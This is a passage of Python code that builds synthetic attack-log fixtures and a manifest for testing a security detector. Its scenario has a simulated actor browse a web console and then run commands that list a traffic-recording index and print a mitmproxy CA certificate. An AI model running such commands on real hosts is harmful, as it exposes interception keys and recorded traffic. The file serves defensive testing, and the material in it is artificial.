    # Scenario 22: v0.2.7 ARTEX Next.js i18n /function/workspace console + de-branded recording-proxy index pair
    cur = t0 + timedelta(hours=29)
    ws_attack: list[dict[str, Any]] = [
        {
            "timestamp": _iso(cur),
            "source_host": "203.0.113.249",
            "actor": "op-i18n",
            "surface": "web_portal",
            "event_type": "http",
            "http_method": "GET",
            "http_path": "/function/workspace?tab=files",
            "status_code": 200,
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/131.0.0.0",
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=3)),
            "source_host": "203.0.113.249",
            "actor": "op-i18n",
            "surface": "endpoint",
            "event_type": "file",
            "command_line": "sqlite3 /opt/workbench/traffic/_index/index.sqlite .tables && cat /opt/workbench/traffic/_ca/mitmproxy-ca-cert.pem",
            "status_code": 0,
        },
        {
            "timestamp": _iso(cur + timedelta(seconds=5)),
            "source_host": "203.0.113.249",
            "actor": "op-i18n",
            "surface": "endpoint",
            "event_type": "file",
            "command_line": "cat /opt/workbench/tasks/211/i0042/cmd-output/001.txt",
            "status_code": 0,
        },
    ]
    p = _write_jsonl(base_dir / "scenario_artex_i18n_workspace_and_debranded_proxy.jsonl", ws_attack)
    manifest["scenario_artex_i18n_workspace_and_debranded_proxy"] = {
        "path": str(p),
        "expected_positive": True,
        "format": "jsonl",
        "surface": "web_portal",
        "expected_reasons": ["artex_console_or_host_forensics"],
    }

    manifest_path = base_dir / "manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    return manifest
